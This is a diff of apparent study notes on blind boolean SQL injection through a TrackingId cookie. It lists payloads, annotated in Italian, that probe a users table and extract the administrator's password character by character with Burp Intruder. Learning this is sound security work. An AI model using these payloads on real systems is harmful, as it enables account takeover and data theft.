@@ -91,7 +91,7 @@ TrackingId=xyz' AND '1'='1 injection sui cookie
 TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a   -> boolean per confermare l'esistenza di una tabella chiamata users
 TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a     -> confermare l'esistenza dell'utente administrator nella tabella users
 TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a      -> determinare caratteri della password
-TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§     -> extract every character from the password and confront it with a character --> intruder per automatizzare
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§     -> extract every character from the password and confront it with a character --> intruder cluster bomb attack per automatizzare
 TrackingId=xyz' AND (SELECT SUBSTRING(password,§2§,1) FROM users WHERE username='administrator')='§a§    -> per la lunghezza della password
 
 OAST techniques
